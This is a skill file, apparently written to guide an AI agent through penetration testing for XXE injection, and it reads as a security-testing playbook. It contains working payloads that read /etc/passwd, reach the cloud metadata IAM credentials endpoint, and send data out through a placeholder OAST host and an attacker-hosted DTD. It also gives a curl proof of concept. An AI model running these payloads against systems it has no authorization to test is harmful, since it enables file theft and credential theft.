---
name: xxe-injection
description: Detect and prove XML External Entity (XXE) injection — server-side file read, SSRF (including cloud metadata), and blind/OOB exfiltration via XML parsing of external entities. Use when a request has an XML body or SOAP, Content-Type is application/xml or text/xml, you see a DTD/DOCTYPE/<!ENTITY>, there are SVG/DOCX/XLSX/PDF/file uploads or SAML, or you suspect SSRF via XML or blind XXE that needs OAST.
---

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
Any place untrusted input reaches an XML parser:
- Request bodies that are XML (`<?xml ...?>`, `<soap:Envelope>`, RPC/REST XML APIs).
- File uploads in XML-backed formats: SVG, DOCX/XLSX/PPTX (zipped XML), SVG-in-PDF, GPX, KML, RSS.
- SAML responses, WS-Security, XML-RPC.
- Forms posting `application/x-www-form-urlencoded` or JSON — try switching the body to XML (parsers are often still wired in).

## Impact & priority
High-signal when proven. Realistic outcomes:
- Arbitrary server-side **file read** (`/etc/passwd`, app config, source, secrets, `/proc/self/environ`).
- **SSRF**: reach internal services and cloud metadata (`http://169.254.169.254/...`) → often credentials/IAM tokens.
- Occasionally **RCE** (e.g., PHP `expect://`, vulnerable parsers) — rare, verify before claiming.
Prioritize when data is actually returned or exfiltrated. SSRF-to-metadata that yields creds is a top finding.

## Detection
1. Inject a benign entity and reference it where a value is echoed back. If `&xxe;` resolves, the parser expands entities.
2. **File read test**: define `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, reference it in a field that is reflected in the response.
3. **Blind / OAST**: if nothing is reflected, point an external entity at your collaborator/OAST host and watch for DNS/HTTP hits. Use a **parameter entity** (`%`) if a normal entity in the DTD fails:
   `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://OAST_HOST"> %xxe; ]>`

## Exploitation
- **File retrieval** — inject DOCTYPE + external entity, reference in a reflected field:
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```
- **SSRF / cloud metadata** — `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`.
- **Blind OOB exfil (external DTD)** — host `malicious.dtd`, then reference it. See reference.md for the full DTD; this exfiltrates file contents to your server.
- **Error-based exfil** — when OOB egress is blocked, force a parse error embedding file contents in the error message (reference.md).
- **XInclude** — when you don't control the whole document (only a value gets placed into server-side XML):
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
  ```
- **File upload (SVG)** — upload an SVG carrying the entity; read its rendered/echoed output:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  ```
- **Content-Type switch** — change `Content-Type` to `application/xml` and rewrite the body as XML to expose a hidden parser.

## Common bypasses
- Use **XInclude** when only part of the document is yours.
- Use **parameter entities** (`%`) when `&` entities are stripped or when nesting in a DTD.
- If external network egress is blocked, **repurpose a local DTD** on the target to run error-based exfil. See reference.md.

## Minimal PoC
Concrete, safe file-read repro to log in `./_EXPLOIT/` (reads a non-sensitive file like `/etc/hostname`; swap to `/etc/passwd` only if needed to prove read):
```bash
curl -sk 'https://TARGET/product/stock' \
  -H 'Content-Type: application/xml' \
  --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>'
```
Capture the request + the response containing the file contents. For blind, capture the OAST log entry / exfil hit instead.

## Don't report as noise
- Entity expansion or DTD acceptance with **no data returned and no OOB interaction** — not proven.
- Billion-laughs / entity-expansion DoS — out of scope and destructive; do not run.
- "The parser might be vulnerable" with no PoC. Prove file read, SSRF interaction, or data exfil.

## Deep reference
See reference.md for full payloads (external DTD exfil, error-based, local-DTD repurposing, upload/format details, finding hidden surface, prevention).
- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
